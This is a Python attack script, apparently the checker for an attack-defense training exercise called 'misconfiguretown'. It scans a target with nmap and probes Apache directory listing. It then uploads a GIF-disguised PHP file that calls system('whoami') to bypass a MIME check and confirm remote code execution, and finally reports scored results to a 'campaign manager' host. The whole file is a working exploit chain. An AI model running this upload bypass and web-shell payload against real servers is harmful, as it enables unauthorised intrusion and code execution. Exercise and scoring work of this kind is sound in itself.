import sys
import os
import time
import socket
import subprocess
import requests
import re

if(len(sys.argv) != 3):
    print("Script takes 2 argument; IP address of host. to attack and the campaign managers ip")
    exit()

#############  SETUP  #############
target_ip = sys.argv[1]
manager_ip = sys.argv[2]
print("Attacking "+target_ip+" from my own ip: "+manager_ip)
requests.post("http://"+manager_ip+":8855/info",json={"error":"script running"})

#############  NMAP  #############
os.system("nmap -sC -sV "+target_ip)
time.sleep(20)


#############  REQUESTS  #############


listdirs = False
showbackup = False
uploadphp = False
codeexecution = False


#view directories in apache
res = requests.get("http://"+target_ip+"/uploads")
print(res.text)
if "<title>Index of /uploads" in res.text:
    listdirs=True
    print("I can list the dirs.")
time.sleep(2)


#view backups folder 
res = requests.get("http://"+target_ip+"/backups")
print(res.text)
if "<title>Index of /backups" in res.text:
    showbackup=True
    print("I can see the backup content.")
time.sleep(2)

#Check if we can upload php files.
f = open("upload.gif.php","w+")
f.write("GIF89a<?php system('whoami');?>")
f.close()

uploadedFile = ""
g = open("upload.gif.php","rb")
files = {"fileToUpload":g}
res = requests.post("http://"+target_ip+"/upload.php",files=files)
if("The file has been uploaded." in res.text and ".php" in res.text):
    uploadedFile = re.findall('href=(.+)>This', res.text)[0]
    uploadphp = True
    print("uploaded php file")
    print("the file was"+str(files))
    print(uploadedFile+"was where it was put")
time.sleep(2)

#Check if it executes system code
if(uploadphp):
    res = requests.get("http://"+target_ip+"/"+uploadedFile)
    if("www-data" in res.text):
        codeexecution = True
        print("managed to get code execution")
time.sleep(2)

toPost= {
    "attackName": "misconfiguretown",
    "checks": [
        {
            "name": "List dirs",
            "description": "True if apache is still misconfigured for me to list content of dirs",
            "patched": not listdirs,
            "score": 20
        },
        {
            "name": "Show backup",
            "description": "True if you can still view the backup folder.",
            "patched": not showbackup,
            "score": 30
        },
        {
            "name": "Upload php",
            "description": "True if you can still upload .php files by cheating mime check.",
            "patched": not uploadphp,
            "score": 40
        },
        {
            "name": "Execute php",
            "description": "True if an attacker can execute the php code that he/she has uploaded",
            "patched": not codeexecution,
            "score": 40
        }
    ]
}

requests.post("http://"+manager_ip+":8855/info",json=toPost)

